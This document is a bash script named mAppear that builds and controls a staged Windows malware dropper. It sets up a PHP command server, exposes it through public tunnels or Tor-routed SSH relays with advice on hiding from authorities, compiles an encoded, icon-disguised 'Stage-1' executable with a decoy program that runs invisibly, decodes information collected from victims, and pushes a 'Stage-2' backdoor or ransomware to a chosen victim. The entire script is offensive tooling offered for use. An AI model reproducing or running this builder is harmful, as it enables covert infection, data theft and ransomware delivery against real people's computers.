#!/bin/bash
#coding:utf-8
#title:mAppear
#author:hacknonym
#launch:./mAppear.sh  |  . mAppear.sh  |  bash mAppear.sh

#terminal text color code
cyan='\e[0;36m'
purple='\e[0;7;35m'
purpleb='\e[0;35;1m'
orange='\e[38;5;166m'
orangeb='\e[38;5;166;1m'
white='\e[0;37;1m'
grey='\e[0;37m'
green='\e[0;32m'
greenb='\e[0;32;1m'
greenh='\e[0;42;1m'
red='\e[0;31m'
redb='\e[0;31;1m'
redh='\e[0;41;1m'
redhf='\e[0;41;5;1m'
yellow='\e[0;33m'
yellowb='\e[0;33;1m'
yellowh='\e[0;43;1m'
blue='\e[0;34m'
blueb='\e[0;34;1m'
blueh='\e[0;44;1m'

MAIN_PATH=$(pwd)

function user_privs(){
	if [ $EUID -eq 0 ] ; then 
  		echo -n
  	else
  		echo -e "$redb[x]$grey You don't have root privileges"
  		exit 0
	fi
}
function internet(){
	ping -c 1 -W 1 8.8.4.4 1> /dev/null 2>&1 || { 
		echo -e "$redb[x]$grey No Internet connection"
		return 2
	}
}

function verify_prog(){
    which $1 1> /dev/null 2>&1 || { 
    	echo -e "$redb[x]$grey $1$yellow not installed$grey"
    	echo -ne "$greenb[+]$grey Installation of $yellow$1$grey in progress..."
    	sudo apt-get install -y $2 1> /dev/null
    	echo -e "$green OK$grey"
    }
}
function setup(){
	echo -en "$cyan"
	user_privs
	internet
	if [ $? -eq 2 ] ; then
		exit 0
	else
		echo -e "[+] Check Dependencies..."
		verify_prog "php" "php"
		verify_prog "base64" "coreutils"
		verify_prog "httping" "httping"
		verify_prog "tor" "tor"
		verify_prog "proxychains" "proxychains"
		verify_prog "i686-w64-mingw32-gcc" "gcc-mingw-w64-i686"
		verify_prog "openssl" "openssl"
		verify_prog "netstat" "net-tools"
		verify_prog "hostname" "hostname"
	fi
}

function launch_server(){
	default_port="80"
	echo -e """$yellowb[i]$grey If the target machine has an Internet access the port 80 (output connection) is the most likely port not to be blocked by the firewall
"""
	echo -ne "$blueb[?]$grey Port of PHP Server default($yellow$default_port$grey)"
	read -p " > " port
	port="${port:-${default_port}}"
	fuser -k $port/tcp 1> /dev/null 2>&1
	echo -e "$greenb[+]$grey Starting PHP Server..."
	cp $MAIN_PATH/templates/index.php $MAIN_PATH/
	php -S 0.0.0.0:$port -c php.ini 1> /dev/null 2>&1 &

	externalizeHTTPServer
}

function externalizeHTTPServer(){
	echo -e """\n$redb Level of Anonymity /3

$white 1) Localhost only  $redb 0/3$grey
     Here the data is sent directly to the server hosted inside the local network.

$white 2) Manualy Open NAT port on the router  $redb 0/3$grey
     Here the data is sent directly to the server hosted
     on your network, no anonymity for this use case.

$white 3) Open Public Relays (Remote Port Forwarding)  $redb 1/3$grey
     Public relays allow port forwarding from a local server
     to a remote host (relay server), so it is not necessary
     to open NAT ports on the router. However, we have no
     knowledge of the logs stored there as well as their potential
     disclosure to the authorities.
     In addition, some public relays only perform redirects for a limited time.
     It is likely that some of these servers are H.S.

$white 4) Using your Remote SSH Relay (Remote Port Forwarding)  $redb 2~3/3$grey
     In the event that the redirection server is yours, it must be 
     hosted on an anonymous VPS, that it be purchased with untraceable 
     money, ensure that the service provider is not logging or that the 
     latter does not disclose them to the authorities.
     For more anonymity, connect to the server via a proxy e.g. Tor.
     $yellow[!]$grey Port $white$port$grey on your server must be accessible from the internet.
"""

	read -p "> " -n 1 -e option

	case $option in
		1 ) 
			nb_loc_ip=$(
				c=0
				for i in $(hostname -I) ; do 
					c=$(($c + 1))
				done && echo $c
			)

			if [ $nb_loc_ip -eq 0 ] ; then
				echo -e "$redb[x]$grey Your are not connected to a network"
				sleep 1 && externalizeHTTPServer
			elif [ $nb_loc_ip -eq 1 ] ; then
				domain_name_relay=$(hostname -I)
				remoteHTTPserver="http://$domain_name_relay:$port"
				check_connection
			else
				c=0
				for i in $(hostname -I) ; do
					tab_ip[$c]="$i"
					c=$(($c + 1))
				done

				echo -e
				for i in $(seq 1 $c) ; do
					echo -e "$white $i)$grey ${tab_ip[$(($i-1))]}"
				done
				echo -e
				echo -ne "$blueb[?]$grey Local IP address"
				read -p " > " -n 1 -e ip_index
				ip_index=$(($ip_index - 1))
				domain_name_relay=${tab_ip[$ip_index]}

				if [ ! -z "$domain_name_relay" ] ; then
					remoteHTTPserver="http://$domain_name_relay:$port"
					check_connection
				else
					echo -e "$redb[x]$grey Error no IP specified"
					sleep 1 && externalizeHTTPServer
				fi
			fi
			;;
		2 ) 
			localip=$(hostname -I)
			echo -e "$yellowb[i]$grey Open port $yellow$port$grey for local IP $yellow$localip$grey on the router"
			publicip=$(wget -qO- ipinfo.io/ip)
			remoteHTTPserver="http://$publicip:$port"

			read -p "Push ENTER to continue"
			check_connection;;

		3 ) public_relays;;

		4 ) 
			echo -ne "$blueb[?]$grey SSH Server Username"
			read -p " > " sshuser
			echo -ne "$blueb[?]$grey SSH Server IP/Domain Name"
			read -p " > " domain_name_relay
			default_sshport="22"
			echo -ne "$blueb[?]$grey SSH Server Port default($yellow$default_sshport$grey)"
			read -p " > " sshport
			sshport="${sshport:-${default_sshport}}"

			echo -ne "$blueb[?]$grey Using Tor (Y/n)"
			read -p " > " usetor

			if [[ "$usetor" =~ ^[YyOo]$ ]] ; then
				echo -e "$greenb[+]$grey Starting Tor Service..."
				echo -e "$yellowb[i]$grey Using default proxychains configuration"
				sudo service tor start
				echo -e "$yellowb[>]$yellow proxychains ssh -R $port:0.0.0.0:$port $sshuser@$domain_name_relay -p $sshport -q -N -f$grey"
				proxychains ssh -R $port:0.0.0.0:$port $sshuser@$domain_name_relay -p $sshport -q -N -f
			else
				echo -e "$yellowb[>]$yellow ssh -R $port:0.0.0.0:$port $sshuser@$domain_name_relay -p $sshport -q -N -f$grey"
				ssh -R $port:0.0.0.0:$port $sshuser@$domain_name_relay -p $sshport -q -N -f
			fi
			
			remoteHTTPserver="http://$domain_name_relay:$port"
			check_connection;;

		* ) echo -e "$redb[x]$grey Error Syntax" && externalizeHTTPServer;;
	esac
}

function public_relays(){
	echo -e """$grey
$yellowb Choose the Public HTTP Relay   $cyan(port 80 only)

$white 1) serveo.net
$white 2) $cyan*$white ssh.localhost.run
$white 3) $cyan*$white openport
$white 4) $cyan*$white Localtunnel
$white 5) $cyan*$white LocalXpose
$white 6) $cyan*$white Pagekite
$white 7) $cyan*$white Ngrok
$white 8) Back
"""

	read -p "> " -n 1 -e option

	case $option in

	1 | 01 )
	    echo -e "$greenb[+]$grey Starting SSH Tunneling..."
	    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R $port:127.0.0.1:$port serveo.net > sendlink.txt &
	    c=10 ; for i in $(seq 0 10) ; do
			sleep 1
			echo -en "\r $c(s) Connection in progress..."
			c=$(($c - 1))
		done ; echo
	    remoteHTTPserver=$(cat sendlink.txt | grep -o "https://[0-9a-z]*\.serveo.net")
	    domain_name_relay=$(echo -e "$remoteHTTPserver" | cut -d '/' -f 3)
	    if [ -z "$remoteHTTPserver" ] ; then
			echo -e "$redb[x]$grey Connection failed"
			externalizeHTTPServer
		else
			check_connection
		fi;;

	2 | 02 )
		echo -e "$greenb[+]$grey Starting SSH Tunneling..."
	    subdomain=$((RANDOM%${randomness}+999))
	    gnome-terminal -t "ssh.localhost.run" -x bash -c "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:127.0.0.1:$port $subdomain@ssh.localhost.run > sendlink.txt" 2> /dev/null &
	    c=10 ; for i in $(seq 0 10) ; do
			sleep 1
			echo -en "\r $c(s) Connection in progress..."
			c=$(($c - 1))
		done ; echo
	    remoteHTTPserver=$(cat sendlink.txt | grep -o "http://[0-9a-z]*\-[0-9a-z]*\.localhost.run" | sort | uniq)
	    domain_name_relay=$(echo -e "$remoteHTTPserver" | cut -d '/' -f 3)
	    if [ -z "$remoteHTTPserver" ] ; then
			echo -e "$redb[x]$grey Connection failed"
			externalizeHTTPServer
		else
			check_connection
		fi;;

	3 | 03 )
		cd $MAIN_PATH/relays/
		which openport 1> /dev/null 2>&1 || { 
	    	echo -e "$greenb[+]$grey Installation of$yellow openport$grey in progress..."
	    	sudo dpkg -i openport_*.deb 1> /dev/null
    	}
		
		echo -e "$greenb[+]$grey Starting SSH Tunneling..."
	    openport -K
	    openport --local-port $port --http-forward --ip-link-protection True > sendlink.txt 2> /dev/null &
	    c=10 ; for i in $(seq 0 10) ; do
			sleep 1
			echo -en "\r $c(s) Connection in progress.."
			c=$(($c - 1))
		done ; echo
	    remoteHTTPserver=$(cat sendlink.txt | grep -e "https://www.openport.io/" | cut -d ' ' -f 14 | cut -d '=' -f 2)
	    domain_name_relay=$(echo -e "$remoteHTTPserver" | cut -d '/' -f 3)
	    if [ -z "$remoteHTTPserver" ] ; then
			echo -e "$redb[x]$grey Connection failed"
			externalizeHTTPServer
		else
			check_connection
		fi;;

	4 | 04 )
		which lt 1> /dev/null 2>&1 || { 
		    echo -e "$greenb[+]$grey Installation of$yellow Localtunnel$grey in progress..."
		   	npm install -g localtunnel 1> /dev/null
		   	npm install -g npm 1> /dev/null
	    }

	    echo -e "$greenb[+]$grey Connection Localtunnel Server..."
	    lt -l 127.0.0.1 -p $port > sendlink.txt 2> /dev/null &
	    c=10 ; for i in $(seq 0 10) ; do
			sleep 1
			echo -en "\r $c(s) Connection in progress..."
			c=$(($c - 1))
		done ; echo
	    remoteHTTPserver=$(cat sendlink.txt | cut -d ' ' -f 4)
	    domain_name_relay=$(echo -e "$remoteHTTPserver" | cut -d '/' -f 3)
	    if [ -z "$remoteHTTPserver" ] ; then
			echo -e "$redb[x]$grey Connection failed"
			externalizeHTTPServer
		else
			check_connection
		fi;;

	5 | 05 )
	    echo -e "$greenb[+]$grey Connection LocalXpose Server..."
	    cd $MAIN_PATH/relays/
	    ./loclx-linux-amd64 update
	    ./loclx-linux-amd64 tunnel http --to 127.0.0.1:$port > sendlink.txt 2> /dev/null &
	    c=10 ; for i in $(seq 0 10) ; do
			sleep 1
			echo -en "\r $c(s) Connection in progress..."
			c=$(($c - 1))
		done ; echo
	    remoteHTTPserver=$(cat sendlink.txt | grep -e "https" | cut -d ' ' -f 2)
	    domain_name_relay=$(echo -e "$remoteHTTPserver" | cut -d '/' -f 3)
	    if [ -z "$remoteHTTPserver" ] ; then
			echo -e "$redb[x]$grey Connection failed"
			externalizeHTTPServer
		else
			check_connection
		fi;;

	6 | 06 )
	    subdomain=$((RANDOM%${randomness}+999))
	    echo -e "$greenb[+]$grey Connection PageKite Server..."
	    cd $MAIN_PATH/relays/
	    python2 pagekite.py --clean --signup $port $subdomain.pagekite.me > sendlink.txt 2> /dev/null &
	    c=10 ; for i in $(seq 0 10) ; do
			sleep 1
			echo -en "\r $c(s) Connection in progress..."
			c=$(($c - 1))
		done ; echo
	    remoteHTTPserver=$(cat sendlink.txt)
	    domain_name_relay=$(echo -e "$remoteHTTPserver" | cut -d '/' -f 3)
	    if [ -z "$remoteHTTPserver" ] ; then
			echo -e "$redb[x]$grey Connection failed"
			externalizeHTTPServer
		else
			check_connection
		fi;;

	7 | 07 )
		echo -e "$greenb[+]$grey Connection Ngrok Server..."
    	cd $MAIN_PATH/relays/
    	./ngrok http $port 1> /dev/null 2>&1 &
	    c=10 ; for i in $(seq 0 10) ; do
			sleep 1
			echo -en "\r $c(s) Connection in progress..."
			c=$(($c - 1))
		done ; echo
	    for i in $(netstat -puntl | grep -e "LISTEN" | grep -e "ngrok" | awk '{print $4}' | cut -d ':' -f 2) ; do	
			if httping -c 1 -t 1 http://127.0.0.1:$i 1> /dev/null ; then
				remoteHTTPserver=$(curl -s -N http://127.0.0.1:$i/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	    		domain_name_relay=$(echo -e "$remoteHTTPserver" | cut -d '/' -f 3)
			    if [ -z "$remoteHTTPserver" ] ; then
					echo -e "$redb[x]$grey Connection failed"
					externalizeHTTPServer
				else
					check_connection
				fi
	    	fi
		done;;

	9 | 09 )
		externalizeHTTPServer;;

	* ) 
		echo -e "$redb[x]$grey Error Syntax" && sleep 1
		relays;;

	esac
}

function check_connection(){
	c=3 ; for i in $(seq 0 3) ; do
		echo -en "\r$yellowb[i]$grey Test connection in $c(s)"
		sleep 1
		c=$(($c - 1))
	done
	echo -e ""

	echo -en "$greenb[+]$grey Test ping on $yellow$remoteHTTPserver$grey...$grey"
	if httping -c 1 -t 1 $remoteHTTPserver 1> /dev/null ; then
		echo -e "$greenb Success$greey"
		echo -e "$yellowb[i]$grey The HTTP server is accessible from Internet"

		if [ ! -z "$ip_index" ] ; then
			diagram 1
		elif [ ! -z "$publicip" ] ; then
			diagram 2
		else
			diagram 3
		fi
		generate_stage1
	else
		echo -e "$greenb Failed$greey"
		echo -e "$redb[x]$grey Error $yellow$remoteHTTPserver$grey not accessible"
		echo -e "$yellowb[i]$grey Possible check your firewall or DNS"
		externalizeHTTPServer
	fi
}

function diagram(){
	case $1 in
		1 ) 
			echo -e """$yellowb[i]$grey Localhost configuration

  Initial PHP Server
        _____
       /____/|
       | -- ||
       |    ||
       |   -||
       |____//
  $yellow $domain_name_relay$white:$green$port$grey
""";;
		2 ) 
			echo -e """$yellowb[i]$grey Forwarding configuration

  Initial PHP Server
      _____             Router
     /____/|           _______
     | -- ||          /______/|
     |    ||  ----->  |      ||  -----> $blueb INTERNET$grey
     |   -||          |______|/
     |____//
  $yellow 0.0.0.0$white:$green$port$grey      $yellow$publicip$white:$green$port$grey
""";;
		3 ) 
			echo -e """$yellowb[i]$grey Forwarding configuration

  Initial PHP Server   Relay Server
      _____              _____
     /____/|            /____/|
     | -- ||            | -- ||
     |    ||   ----->   |    ||  -----> $blueb INTERNET$grey
     |   -||            |   -||
     |____//            |____|/
  $yellow 0.0.0.0$white:$green$port$grey     $yellow$domain_name_relay$publicrelay$white:$green$port$grey
""";;

	esac
}

function generate_stage1(){
	echo -e "$greenb[+]$grey Remove output/*"
	mkdir $MAIN_PATH/output 1> /dev/null 2>&1
	rm -f $MAIN_PATH/output/* 1> /dev/null 2>&1
	IDstage1=$((RANDOM%10000+1))
	echo -e "$greenb[+]$grey Stage-1 ID generate : $green$IDstage1$grey"
	echo -e """
$white 1) Compiling in C language (+Encoding)$grey
     + Launch a local program
     + Downlaod a remote program on Internet

$white 2) Compiling with (Bat to Exe Converter)$grey
     + Launch a local program
     + Downlaod a remote program on Internet
     + Include any decoy program
"""
	read -p "> " -n 1 -e option

	echo -e """
$yellowb Decoy Program$yellow\n
$white 1) Downlaod a remote program on Internet$grey (http(s)://..)
$white 2) Launch a local program$grey e.g. (calc.exe)
$white 3) Include any decoy program $yellow(Bat to Exe Converter only)$grey
"""
	read -p "> " -n 1 -e option2

	case $option in
		#Compiling in C Language
		1 ) 
			case $option2 in
				1 ) 
					echo -e "$yellowb[i]$grey The decoy program will start at execution"
					echo -e "$grey e.g. (https://www.avast.com/avast.exe)"
					echo -e " e.g. (https://images.google.com/landscape.jpg)"
					echo -en "$blueb[?]$grey URL Address of the decoy program"
					read -p " > " decoyProgDownload
					uri=$(echo -e "$decoyProgDownload" | cut -d '/' -f 3-)
					decoyProgName=$(
						for i in $(echo -e "$uri" | tr '/' ' ') ; do
							echo -e "$i"
						done | tail -n 1
					)
					decoyProgDownload="curl $decoyProgDownload -o $decoyProgName";;
				2 ) 
					echo -e "$yellowb[i]$grey Use a program already present locally on the victim"
					echo -e "$grey e.g. (calc.exe)"
					echo -e " e.g. (\"C:\\\\\\Program Files\\\\\\Windows Media Player\\\\\\wmplayer.exe\")"
					echo -en "$blueb[?]$grey Name of the program"
					read -p " > " decoyProgName
					decoyProgDownload="cls";;

				* ) echo -e "$redb[x]$grey Error Syntax" && sleep 1 && generate_stage1;;
			esac

			echo -ne "$blueb[?]$grey Name of Stage-1 (without spaces)"
			read -p " > " nameStage1
			echo -ne "$blueb[?]$grey Icon (.ico) of Stage-1 (absolute path)"
			read -p " > " iconStage1
			if [ -f $iconStage1 ] ; then
				iconStage1Name=$(
					for i in $(echo -e "$iconStage1" | tr '/' ' ') ; do
						echo -e "$i"
					done | tail -n 1
				)
				echo -e "$greenb[+]$grey Copy file $iconStage1Name to output/"
				cp $iconStage1 $MAIN_PATH/output/
			else
				echo -e "$redb[x]$grey Error file does not exist" && sleep 1 && generate_stage1
			fi

			default_iteration="400"
			echo -ne "$blueb[?]$grey Number iteration for encoding default($yellow$default_iteration$grey)"
			read -p " > " iteration
			iteration="${iteration:-${default_iteration}}"

			cd $MAIN_PATH/output/

			#Inlude an ICON
			echo -e "$greenb[+]$grey Generate output/ressource.rc"
			echo -e "1 ICON \"$iconStage1Name\"" > ressource.rc

			#Create C program
			echo -e "$greenb[+]$grey Creation of output/stage1.c..."
			echo -e "#include <stdio.h>" > stage1.c
			echo -e "#include <winsock2.h>" >> stage1.c
			echo -e "#include <windows.h>" >> stage1.c

			echo -e "$greenb[+]$grey First encoding output/stage1.c..."
			#Encode with encoding.sh (-> https://github.com/Screetsec/TheFatRat/blob/master/powerfull.sh  generatePadding())
			. $MAIN_PATH/encoding.sh $iteration >> stage1.c

			echo -e "$greenb[+]$grey Adding specific information..."
			echo -e "" >> stage1.c
			sed 's+IDstage1+'"$IDstage1"'+g' $MAIN_PATH/templates/stage1.c | sed 's+decoyProgDownload+'"$decoyProgDownload"'+g' | sed 's+decoyProgName+'"$decoyProgName"'+g' | sed 's+remoteHTTPserver+'"$remoteHTTPserver"'+g' >> stage1.c

			echo -e "$greenb[+]$grey Second encoding output/stage1.c..."
			. $MAIN_PATH/encoding.sh $iteration >> stage1.c

			#Compile C program
			echo -e "$greenb[+]$grey Compilation of output/stage1.c..."
			i686-w64-mingw32-windres ressource.rc -O coff -o icone.o
			i686-w64-mingw32-gcc stage1.c icone.o -o $nameStage1.exe -lws2_32

			echo -e "$yellowb[i]$grey Stage-1 has been created ->$yellow output/$nameStage1.exe$grey"
			echo -e "$yellowb[i]$grey All information will be send to$yellow output.log$grey file, please do not remove it"
			exit 0;;

		#Bat to Exe Converter
		2 ) 
			case $option2 in
				1 ) 
					echo -e "$yellowb[i]$grey The decoy program will start at execution"
					echo -e "$grey e.g. (https://www.avast.com/avast.exe)"
					echo -e " e.g. (https://images.google.com/landscape.jpg)"
					echo -en "$blueb[?]$grey URL Address of the decoy program"
					read -p " > " decoyProgDownload
					uri=$(echo -e "$decoyProgDownload" | cut -d '/' -f 3-)
					decoyProgName=$(
						for i in $(echo -e "$uri" | tr '/' ' ') ; do
							echo -e "$i"
						done | tail -n 1
					)
					decoyProgDownload="curl $decoyProgDownload -o $decoyProgName";;
				2 ) 
					echo -e "$yellowb[i]$grey Use a program already present locally on the victim"
					echo -e "$grey e.g. (calc.exe)"
					echo -e " e.g. (\"C:\\\\\\Program Files\\\\\\Windows Media Player\\\\\\wmplayer.exe\")"
					echo -en "$blueb[?]$grey Name of the program"
					read -p " > " decoyProgName
					decoyProgDownload="cls";;
				3 ) 
					echo -e "$grey e.g. $HOME/Programs/avast.exe"
					echo -e " e.g. /root/Images/landscape.jpg"
					echo -en "$blueb[?]$grey Specify your decoy program (absolute path)"
					read -p " > " decoyPath
					
					if [ -f $decoyPath ] ; then
						decoyProgName=$(
							for i in $(echo -e "$decoyPath" | tr '/' ' ') ; do
								echo -e "$i"
							done | tail -n 1
						)
						echo -e "$greenb[+]$grey Copy file $decoyProgName to output/"
						cp $decoyPath $MAIN_PATH/output/
					else
						echo -e "$redb[x]$grey Error file does not exist" && sleep 1 && generate_stage1
					fi
					embedded_prog="1"
					decoyProgDownload="cls";;

				* ) echo -e "$redb[x]$grey Error Syntax" && sleep 1 && generate_stage1;;
			esac

			echo -ne "$blueb[?]$grey Name of Stage-1 (without spaces)"
			read -p " > " nameStage1
			echo -ne "$blueb[?]$grey Icon (.ico) of Stage-1 (absolute path)"
			read -p " > " iconStage1
			if [ -f $iconStage1 ] ; then
				iconStage1Name=$(
					for i in $(echo -e "$iconStage1" | tr '/' ' ') ; do
						echo -e "$i"
					done | tail -n 1
				)
				echo -e "$greenb[+]$grey Copy file $iconStage1Name to output/"
				cp $iconStage1 $MAIN_PATH/output/
			else
				echo -e "$redb[x]$grey Error file does not exist" && sleep 1 && generate_stage1
			fi

			cd $MAIN_PATH/output/

			echo -e "$greenb[+]$grey Adding specific information..."
			sed 's+IDstage1+'"$IDstage1"'+g' $MAIN_PATH/templates/stage1.bat | sed 's+decoyProgDownload+'"$decoyProgDownload"'+g' | sed 's+decoyProgName+'"$decoyProgName"'+g' | sed 's+remoteHTTPserver+'"$remoteHTTPserver"'+g' > stage1.bat

			echo -e """
┌───────────────────────────────────────────────────
│$white Protocol:$grey
│ Open Bat_to_Exe_converter.exe
│
│ Convert 'stage1.bat' in '$nameStage1.exe'"""
if [ "$embedded_prog" = 1 ] ; then
	echo -e "│    └─Embed '$decoyProgName'"
	echo -e "│    └─Extract to: 'AppData'"
fi
if [ -f "$iconStage1" ] ; then
	echo -e "│    └─Icon: '$iconStage1Name'"
fi
echo -e """│    └─Exe-Format: '64 Bit | Windows (Invisible)'
│    └─Include version informations
└────────────────────────────────────────────────────
"""
			echo -e "$yellowb[i]$grey ->$yellow output/stage1.bat$grey"
			if [ "$embedded_prog" = 1 ] ; then
				echo -e "$yellowb[i]$grey ->$yellow output/$decoyProgName$grey"
			fi
			if [ -f "$iconStage1" ] ; then
				echo -e "$yellowb[i]$grey ->$yellow output/$iconStage1Name$grey"
			fi
			echo -e "$yellowb[i]$grey All information will be send to$yellow output.log$grey file, please do not remove it"
			exit 0;;

		* ) echo -e "$redb[x]$grey Error Syntax" && sleep 1 && generate_stage1;;
	esac
	exit 0
}

function assembly(){
	content=$(cat $MAIN_PATH/$1 | tr ' ' '+')

	for i in $(echo -e "$content") ; do
		if echo -e "$i" | grep -e "|" 1> /dev/null ; then
			echo -en "\n$i"
		elif echo -e "$i" | grep -e "=" 1> /dev/null ; then
			echo -en "$i"
		else
			echo -en "$i"
			echo -en "A"
		fi
	done
}

function decode_info(){
	recovered_data_encoded="output.log"
	replog="stage1_log"
	mkdir $MAIN_PATH/$replog 1> /dev/null 2>&1

	if [ ! -f "$MAIN_PATH/$recovered_data_encoded" ] ; then
		echo -e "$redb[x]$grey output.log file not found"
		exit 0
	fi

	echo -e "$greenb[+]$grey Assembly of encoded data..."
	for i in $(assembly "$recovered_data_encoded") ; do
		id=$(echo -e "$i" | cut -d '|' -f 1)
		date=$(echo -e "$i" | cut -d '|' -f 2 | tr '_' ' ')

		if ls $MAIN_PATH/$replog/ | grep -e "$id" 1> /dev/null ; then
			echo -e "$yellowb[i]$grey ID: $yellow$id$grey Date: $yellow$date$grey already exist"
		else
			echo -e "$greenb[i]$grey New ID: $id added ->$yellow stage1_log/$id.log$grey"
			data=$(echo -e "$i" | cut -d '|' -f 3)

			echo > $MAIN_PATH/$replog/$id.log
			echo -e "Stage ID : $id" >> $MAIN_PATH/$replog/$id.log
			echo -e "Execution Date : $date\n" >> $MAIN_PATH/$replog/$id.log
			echo -e "$data" | base64 -d >> $MAIN_PATH/$replog/$id.log
		fi
	done

	exit 0
}

function upload_stage2(){
	echo -ne "$blueb[?]$grey Stage-1 ID"
	read -p " > " id
	echo -e "$blueb[?]$grey URL of the Stage-2 (backdoor, ransomware,..)"
	echo -ne "(only .exe format)"
	read -p " > " urlstage2

	echo -e "$yellowb[i]$grey If it's a backdoor - Make sure that the port used is not blocked by the victim machine"
	echo -e "                       - Make sure you have successfully launched the listening server"
	
	read -p "Push ENTER to continue"

	echo -e "$greenb[+]$grey Modify PHP Web Server..."
	sed 's+IDstage1+'"$id"'+g' $MAIN_PATH/templates/index.php | sed 's+urlStage2+'"$urlstage2"'+g' > $MAIN_PATH/index.php

	exit 0
}

function kill_php_server(){
	if netstat -puntl | grep -e "LISTEN" | grep -e "php" | grep -e "0.0.0.0:*" 1> /dev/null ; then
		php_server_port=$(
			for i in $(netstat -puntl | grep -e "LISTEN" | grep -e "php" | awk '{print $4}' | grep -e "0.0.0.0:*" | cut -d ':' -f 2) ; do
				echo -e "$i"
			done
		)

		for i in $(echo -e "$php_server_port") ; do
			echo -e "$greenb[+]$grey Kill port $yellow$i$grey"
			fuser -k $i/tcp 1> /dev/null 2>&1 &
		done
	else
		echo -e "$yellowb[i]$grey No PHP Servers found on$yellow 0.0.0.0:*$grey"
	fi

	exit 0
}

function banner(){
	echo -e """$cyan  _________ __                                  ____ 
 /   _____//  |______     ____   ____          /_   |
 \_____   \   __\__  \   / ___\_/ __ \   ______ |   |  PHP Server $php_server_state
 /        \|  |  / __ \_/ /_/  >  ___/  /_____/ |   |  Port(s) $green$php_server_port$cyan
/_______  /|__| (____  /\___  / \___  >         |___|
        \/           \//_____/      \/"""
}

setup

if netstat -puntl | grep -e "LISTEN" | grep -e "php" | grep -e "0.0.0.0:*" 1> /dev/null ; then
	php_server_state="$greenb⬤$cyan"
	php_server_port=$(
		for i in $(netstat -puntl | grep -e "LISTEN" | grep -e "php" | awk '{print $4}' | grep -e "0.0.0.0:*" | cut -d ':' -f 2) ; do
			echo -en "$i "
		done
	)
else
	php_server_state="$redb⬤$cyan"
fi

banner

while [ true ] ; do
	echo -e """$white
 1) Create a Stage-1
 2) Decode recovered information  $green(-> stage1_log/)$white
 3) Upload a Stage-2 on a specify victim
 4) Kill PHP Server(s)
 5) Quit
$grey"""
	read -p "> " -n 1 -e option
	case $option in
		1 ) launch_server;;
		2 ) decode_info;;
		3 ) upload_stage2;;
		4 ) kill_php_server;;
		5 ) 
			rm $MAIN_PATH/sendlink.txt 1> /dev/null 2>&1
			exit 0;;
		* ) echo -e "$redb[x]$grey Error Syntax" && sleep 1;;
	esac
done
